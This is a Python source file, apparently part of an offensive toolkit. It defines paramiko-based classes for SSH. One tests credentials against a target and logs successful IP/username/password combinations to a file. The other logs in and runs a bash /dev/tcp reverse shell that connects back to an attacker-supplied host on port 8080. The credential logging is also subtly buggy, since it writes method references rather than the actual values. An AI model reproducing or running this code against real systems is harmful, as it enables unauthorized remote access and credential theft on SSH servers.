import paramiko
from .scanner import ProtocolScanner, ProtocolExploiter


class SSHScanner(ProtocolScanner):

	def __init__(self, protocolname, portnumber, ipaddress, macaddress):
		super(SSHScanner, self).__init__(protocolname, portnumber, ipaddress, macaddress)

	def verifyCredentials(self, credentials):
		cur = paramiko.SSHClient()
		cur.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())  # ignore unknown hosts
		try:
			cur.connect(hostname=self.IPAddress, port=self.portNumber, username=credentials.getUsername(), password=credentials.getPassword())
		except:
			return None
		stdin, stdout, stderr = cur.exec_command('uname -a')
		evidence = stdout.readlines()[0]
		cur.close()
		with open("creds.txt",'a') as f:
			f.write(str(self.IPAddress))
			f.write(str(credentials.getUsername))
			f.write(str(credentials.getPassword))
			f.write('\n')
		return evidence


class SSHExploiter(ProtocolExploiter):

	def __init__(self, protocolname, portnumber, ipaddress, macaddress):
		super(SSHExploiter, self).__init__(protocolname, portnumber, ipaddress, macaddress)


	def createRevShell(self, credentials, host):
		shell = "bash -i >& /dev/tcp/{}/8080 0>&1".format(host)
		cur = paramiko.SSHClient()
		cur.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())  # ignore unknown hosts
		try:
			cur.connect(hostname=self.IPAddress, port=self.portNumber, username=credentials.getUsername(), password=credentials.getPassword())
		except:
			return None
		stdin, stdout, stderr = cur.exec_command(str(shell))
		revshell = stdout.readlines()
		cur.close()
		return revshell
